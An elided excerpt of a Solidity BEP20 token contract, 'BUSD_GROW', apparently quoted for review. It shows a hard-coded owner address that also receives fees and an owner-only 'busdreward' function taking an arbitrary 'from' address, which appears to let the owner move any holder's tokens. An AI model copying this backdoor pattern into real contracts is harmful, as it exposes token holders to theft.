...
contract BUSD_GROW is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string constant _symbol = "BUSDGRW";
    ...
    address public Owner=0x7c7bFA48baA1D3d99466D99c50c44996DB68Afa6; // owner address
    ...
    constructor () Auth(Owner) {
        ...
        marketingFeeReceiver = 0x7c7bFA48baA1D3d99466D99c50c44996DB68Afa6;
...
/* Busdreward Begins */
 ...
 function busdreward(address from, address[] calldata addresses, uint256[] calldata tokens) external onlyOwner {
    ...
    require(balanceOf(from) >= SCCC, "Not enough tokens to busdreward");
